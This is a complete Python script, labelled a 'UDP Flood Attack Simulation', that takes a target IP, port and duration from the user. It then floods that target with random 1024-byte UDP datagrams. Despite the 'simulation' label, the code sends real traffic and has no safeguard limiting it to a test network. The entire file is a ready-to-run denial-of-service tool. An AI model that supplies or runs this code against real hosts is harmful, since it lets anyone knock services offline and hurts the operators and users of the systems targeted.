import random
import socket
import time

def udp_flood(target_ip, target_port, duration):
    """Simulates a UDP flood attack."""
    print(f"Starting UDP flood on {target_ip}:{target_port} for {duration} seconds...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)  # Create a random payload
    end_time = time.time() + duration

    sent_packets = 0
    while time.time() < end_time:
        try:
            sock.sendto(bytes_to_send, (target_ip, target_port))
            sent_packets += 1
            if sent_packets % 1000 == 0:
                print(f"Sent {sent_packets} packets...")
        except Exception as e:
            print(f"Error: {e}")
            break

    print(f"UDP flood completed. Sent {sent_packets} packets.")

if __name__ == "__main__":
    print("UDP Flood Attack Simulation")
    print("===========================")
    try:
        # User inputs
        target_ip = input("Enter the target IP address: ").strip()
        target_port = int(input("Enter the target port number: "))
        duration = int(input("Enter the attack duration (in seconds): "))

        # Validate inputs
        if target_port < 1 or target_port > 65535:
            print("Error: Port number must be between 1 and 65535.")
        elif duration <= 0:
            print("Error: Duration must be a positive integer.")
        else:
            # Start the attack
            udp_flood(target_ip, target_port, duration)
    except ValueError:
        print("Invalid input. Please enter valid numbers for port and duration.")
    except KeyboardInterrupt:
        print("\nAttack canceled.")
